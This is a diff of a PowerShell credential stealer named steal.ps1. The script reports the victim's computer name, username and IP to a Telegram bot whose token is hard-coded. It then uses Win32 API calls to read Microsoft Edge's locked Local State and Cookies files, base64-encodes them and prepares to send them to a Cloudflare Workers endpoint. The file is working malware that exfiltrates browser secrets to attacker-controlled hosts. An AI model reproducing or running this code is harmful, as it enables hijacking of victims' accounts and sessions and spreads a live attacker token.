@@ -1,18 +1,21 @@
+# steal.ps1
+# Uses Win32 API to read Edge files even when locked.
+
 $t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
 $c = "6760965981"
 $worker_url = "https://reciever.tyceno89.workers.dev"
 
-# Send PC info
+# Send PC info to Telegram
 $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
 $body = @{ chat_id = $c; text = "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip" }
 Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
 
-# Add Win32 API for reading locked files
+# --- Win32 API to read locked files ---
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 
-public class FileReader
+public class Win32File
 {
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr CreateFile(
@@ -35,12 +38,13 @@ public class FileReader
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool CloseHandle(IntPtr hObject);
 
-    public static byte[] ReadFileWithShare(string path)
+    public static byte[] ReadFileWithSharedAccess(string path)
     {
         const uint GENERIC_READ = 0x80000000;
         const uint FILE_SHARE_READ = 0x00000001;
         const uint FILE_SHARE_WRITE = 0x00000002;
         const uint OPEN_EXISTING = 3;
+
         IntPtr handle = CreateFile(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
         if (handle.ToInt64() == -1)
         {
@@ -65,9 +69,9 @@ public class FileReader
 }
 "@
 
-# Read Local State
+# --- Read Local State ---
 $src_ls = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
-$bytes_ls = [FileReader]::ReadFileWithShare($src_ls)
+$bytes_ls = [Win32File]::ReadFileWithSharedAccess($src_ls)
 if (-not $bytes_ls) {
     $body = @{ chat_id = $c; text = "ERROR: Could not read Local State" }
     Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
@@ -75,9 +79,9 @@ if (-not $bytes_ls) {
 }
 $b64_ls = [Convert]::ToBase64String($bytes_ls)
 
-# Read Cookies.db
+# --- Read Cookies.db ---
 $src_cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
-$bytes_cookies = [FileReader]::ReadFileWithShare($src_cookies)
+$bytes_cookies = [Win32File]::ReadFileWithSharedAccess($src_cookies)
 if (-not $bytes_cookies) {
     $body = @{ chat_id = $c; text = "ERROR: Could not read Cookies.db" }
     Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
@@ -85,7 +89,7 @@ if (-not $bytes_cookies) {
 }
 $b64_cookies = [Convert]::ToBase64String($bytes_cookies)
 
-# Send to worker
+# --- Send to worker ---
 $payload = @{
     pc = $env:COMPUTERNAME
     user = $env:USERNAME
